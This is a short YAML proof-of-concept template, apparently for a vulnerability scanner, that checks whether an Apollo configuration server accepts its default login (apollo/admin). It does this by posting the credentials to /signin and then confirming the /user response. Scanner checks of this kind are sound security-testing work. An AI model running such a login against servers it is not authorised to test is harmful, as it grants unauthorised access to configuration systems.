name: poc-yaml-apollo-default-password
manual: true
transport: http
rules:
  r1:
    request:
      cache: true
      method: POST
      path: /signin
      body: username=apollo&password=admin&login-submit=%E7%99%BB%E5%BD%95
    expression: |
      response.status == 302
  r2:
    request:
      cache: true
      method: GET
      path: /user
    expression: |
      response.status==200 && response.content_type.contains("json") && response.body.bcontains(b'"userId":"apollo"')
expression: r1() && r2()
detail:
  author: Pa55w0rd(https://www.pa55w0rd.online/)
  links:
    - github.com/apolloconfig/apollo